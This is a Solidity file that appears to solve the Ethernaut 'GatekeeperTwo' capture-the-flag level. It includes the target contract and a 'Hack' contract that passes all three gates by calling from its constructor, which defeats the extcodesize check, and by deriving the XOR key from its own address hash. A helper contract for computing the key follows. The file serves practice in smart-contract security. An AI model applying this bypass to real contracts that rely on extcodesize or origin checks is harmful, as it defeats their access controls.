

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "../node_modules/hardhat-console/contracts/console.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

/**
This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

Things that might help:
Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity.
See here for more information. (http://solidity.readthedocs.io/en/v0.4.23/assembly.html) 
The extcodesize call in this gate will get the size of a contract's code at a given address - 
you can learn more about how and when this is set in section 7 of the yellow paper. 
(https://ethereum.github.io/yellowpaper/paper.pdf)
The ^ character in the third gate is a bitwise operation (XOR), 
and is used here to apply another common bitwise operation 
(http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet).
The Coin Flip level is also a good place to start when approaching this challenge.
**/
contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0, "Unable to pass 2");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    unchecked { // Added to make it compatible with 0.8.0+
    console.log(msg.sender);
      require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    }
    _;
  }

  function enter(bytes8 _gateKey) public gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

interface GatekeeperI {
  function enter(bytes8 _gateKey) external returns (bool);
}


contract Hack {

  GatekeeperI gate;

  constructor(address _gate) {
    uint max;
    unchecked {
      max =  uint64(0) - 1  ;
    }
    uint64 data = uint64(max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
    gate = GatekeeperI(_gate);
    gate.enter(bytes8(data));
  }
}


/**
 Just used it to find out the key for gatethree
**/
contract HackHelper {

  GatekeeperI gate;

  constructor(address _gate) {
    gate = GatekeeperI(_gate);
  }

  function getAbiCallBytes() public pure returns(bytes memory) {
     return abi.encodeWithSignature("hack()");
  }

  function partA() public view returns(uint) {
    return uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
  }

  function partB() public view returns(uint) {
    return uint64(getKey());
  }
  
  function partAXORB() public view returns(uint) {
    return partA() ^ partB();
  }

  function partC() public pure returns(uint64) {
    unchecked {
      return uint64(0) - 1  ;
    }
  }

  function getKey() public view returns(bytes8) {
    uint64 data = uint64(partC() ^ partA());
    return bytes8(data);
  }
  

}
